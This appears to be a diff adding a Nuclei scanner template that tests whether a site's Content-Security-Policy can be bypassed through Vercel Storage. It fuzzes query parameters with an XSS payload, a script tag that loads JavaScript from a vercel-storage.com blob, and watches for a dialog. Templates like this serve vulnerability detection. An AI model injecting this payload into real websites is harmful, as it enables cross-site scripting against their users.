@@ -1,0 +1,55 @@
+id: vercel-storage-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Vercel Storage
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,vercel-storage,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "vercel.app"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: vercel_storage_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://udgnoz7mccyaowzp.public.blob.vercel-storage.com/a-LAZhjxXucrzBiROqCt4bsY3n6srlWP.js"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "vercel_storage_csp_xss == true"
+# digest: 4a0a004730450221009426afc6a310b433cc31954890efc3a510b0d6a6e2935c961a6cfdcce430b91502205b16fc0bb57de2eab9f080594b452f0aba317fbf5614a61610b74375c84415c6:922c64590222798bb761d5b6d8e72950
